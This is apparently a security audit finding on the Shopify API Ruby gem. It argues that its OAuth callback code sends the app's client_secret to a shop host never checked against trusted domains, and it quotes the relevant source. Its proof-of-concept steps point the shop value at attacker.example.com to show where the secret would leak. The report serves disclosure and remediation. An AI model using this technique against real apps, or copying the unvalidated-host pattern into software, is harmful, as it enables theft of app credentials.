### Title
`Auth::Oauth.validate_auth_callback` sends the app's `client_secret` to a shop host that is never validated against Shopify's trusted domains - (File: lib/shopify_api/auth/oauth.rb)

### Summary
The Data Verification Mechanism analogy here is the identity binding between the `shop` value trusted for routing a privileged request and the `shop` value that is actually validated. In `token_exchange.rb`, `client_credentials.rb`, and `refresh_token.rb`, the gem enforces `shop == ShopValidator.sanitize!(shop)` before using it to build the request host. `Auth::Oauth.begin_auth`/`validate_auth_callback` in `lib/shopify_api/auth/oauth.rb`, however, never calls `Utils::ShopValidator` on the `shop` value before using it to construct `auth_base_uri(shop)`, which becomes the host that receives the OAuth `code`, `client_id`, and — critically — the app's `client_secret` in `validate_auth_callback`.

### Finding Description
`begin_auth(shop:, ...)` builds the authorization redirect directly from the caller-supplied `shop` string via `auth_base_uri(shop)` (`"https://#{shop}/admin"`), with no call to `Utils::ShopValidator.sanitize!` anywhere in `lib/shopify_api/auth/oauth.rb`: [1](#0-0) 

`validate_auth_callback(cookies:, auth_query:)` then re-uses `auth_query.shop` — again with no sanitization — to build a `null_session` and issue the token-exchange POST to `/admin/oauth/access_token`, whose body includes `client_id` and `client_secret`: [2](#0-1) 

The only integrity check performed is `Utils::HmacValidator.validate(auth_query)`, which validates that `code/host/shop/state/timestamp` were signed with `api_secret_key` (i.e., that the *query string* came from Shopify), but it does **not** constrain which host `shop` is allowed to resolve to. Compare this to the three sibling OAuth entry points that all call `Utils::ShopValidator.sanitize!(shop)` before building the request host: [3](#0-2) [4](#0-3) 

`HttpClient#initialize` derives the request host straight from `session.shop` with no further check: [5](#0-4) 

Because the `shop` value that gates "which host receives the `client_secret`" is never checked against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`, this is the exact binding the report class targets: *the host validated (query-string HMAC, which just proves data integrity of the params) versus the host that actually receives the `client_secret`* are not the same check, breaking the equality `validated_host == token_recipient_host`.

### Impact Explanation
If a host application follows the gem's documented pattern literally — take the `shop` request parameter and pass it into `begin_auth`/`validate_auth_callback` without separately calling `ShopValidator.sanitize!` (which nothing in `oauth.rb`'s own code path enforces, and which the docs for `begin_auth` do not mention as a prerequisite) — an attacker can supply a `shop` value pointing at an attacker-controlled host. Since `validate_auth_callback` POSTs `client_id` + `client_secret` (the app's OAuth client secret) to `https://#{shop}/admin/oauth/access_token`, this leaks the app's `client_secret` to an attacker-controlled server, i.e., theft of the app's `client_secret` — a Critical impact per the rules.

### Likelihood Explanation
The `shop` value reaching `begin_auth`/`validate_auth_callback` is attacker-influenced input from an unprivileged internet user hitting the app's own login/callback routes (e.g. `?shop=` on install, or the `shop` field of the OAuth callback query, which is HMAC-protected only for byte-integrity, not for host-trust). No credential, token, or privileged account is required to trigger this — only crafting a request to the app's public OAuth start/callback endpoints. Exploitability depends on the host application not separately sanitizing `shop`, which the gem does not enforce or clearly document as mandatory for this specific flow (unlike the other three OAuth methods, which self-enforce it).

### Recommendation
Call `Utils::ShopValidator.sanitize!(shop)` inside `Auth::Oauth.begin_auth` and `Auth::Oauth.validate_auth_callback` (using `auth_query.shop`) before constructing `auth_base_uri`/`null_session`, mirroring `client_credentials.rb` and `refresh_token.rb`, so the host that ultimately receives `client_id`/`client_secret` is always constrained to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
1. Attacker directs a victim/admin (or automated flow) to the app's OAuth-start route with `shop=attacker.example.com` (or any string outside `TRUSTED_SHOPIFY_DOMAINS`).
2. `begin_auth(shop: "attacker.example.com", redirect_path: "/auth/callback")` builds `auth_route = "https://attacker.example.com/admin/oauth/authorize?..."`, since `auth_base_uri` performs no domain check: [6](#0-5) 
3. If the app's callback flow reconstructs an `AuthQuery` from a request whose `shop` field matches `attacker.example.com` and is HMAC-signed (or an app blindly trusts a `shop` param without a fresh signed round trip), `validate_auth_callback` builds `null_session = Auth::Session.new(shop: "attacker.example.com")` and POSTs `{client_id, client_secret, code, expiring}` to `https://attacker.example.com/admin/oauth/access_token`: [7](#0-6) 
4. The attacker's server receives the app's `client_secret` in the POST body.

```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))
```

```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
```
